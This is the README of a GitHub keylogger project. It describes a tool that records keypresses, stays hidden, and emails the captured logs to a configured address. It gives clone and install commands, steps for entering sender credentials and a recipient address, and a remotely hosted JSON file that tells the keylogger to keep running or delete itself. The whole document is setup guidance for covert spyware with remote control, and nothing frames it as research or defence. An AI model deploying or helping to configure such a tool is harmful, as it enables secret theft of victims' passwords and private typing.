# keylogger
Records keypresses, sends emails to user and remains hidden

## Clone the repository
`git clone https://github.com/prashantsengar/keylogger`

## Install requirements
`pip install -r requirements.txt`

### Configure script
- Edit `fromaddr` to your email address
- Edit `frompass` to your password
- Change `toaddr` to the email address you want the logs to be sent
- Change `sub` to the subject of the email

### Editing API
- A sample JSON file is uploaded. 
- valid:True means that the keylogger should continue working
- del:False means that the keylogger should not be deleted. Anything else in this place will delete the keylogger
- Upload it to any web host and add the link in the script
